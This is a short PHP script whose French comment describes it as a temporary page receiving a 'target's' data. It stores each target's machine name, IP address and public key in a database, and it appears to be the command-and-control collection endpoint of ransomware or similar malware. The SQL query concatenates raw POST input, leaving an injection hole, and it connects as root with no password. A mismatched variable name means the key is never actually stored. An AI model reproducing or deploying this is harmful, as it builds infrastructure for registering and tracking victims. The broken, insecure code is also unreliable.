<?php
include "database.php";
/* POST_TEMP.PHP 
* page temporaire de réception des données de la cible
* et enregistrement de ces données dans la base de données
*/
if(isset($_POST['machineName']) && isset($_POST['publickey'])){
	$machineName=$_POST['machineName'];
	$ipAddress=$_SERVER['REMOTE_ADDR'];
	$publicKey=$_POST['publicKey'];

	connect("root","")->query("INSERT INTO `infos` (`id`, `machineName`, `ipAddress`, `publickey`) VALUES (NULL, '".$machineName."', '".$ipAddress."','".$publickey."');");
}
